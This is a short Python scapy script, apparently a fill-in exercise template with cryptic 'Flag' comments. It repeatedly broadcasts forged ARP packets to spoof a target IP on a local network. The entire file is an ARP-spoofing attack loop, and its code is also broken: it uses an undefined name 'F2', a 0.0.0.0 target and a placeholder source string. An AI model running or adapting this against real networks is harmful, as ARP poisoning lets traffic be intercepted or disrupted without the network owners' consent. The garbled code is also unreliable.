from scapy.all import *
import time
#import Flag1

eth = Ether();
eth.src = F2
eth.dst = "ff:ff:ff:ff:ff:ff";

#Flag2=F1.F2
#Flag3
#Flag4=F3.F4
arp = ARP();
arp.pdst = "0.0.0.0";
#arp. = F10
arp.psrc = 'ARP Spoof Target IP'
#F8 = F9
packet = eth / arp;
#Flag5=F5.F6.F7.F8.F9.F10.F11

while True:
	send(packet)
	#F11(packet)
	print('Sending ARP Spoof......')
	time.sleep(2)
	#Flag1.sleep(2)


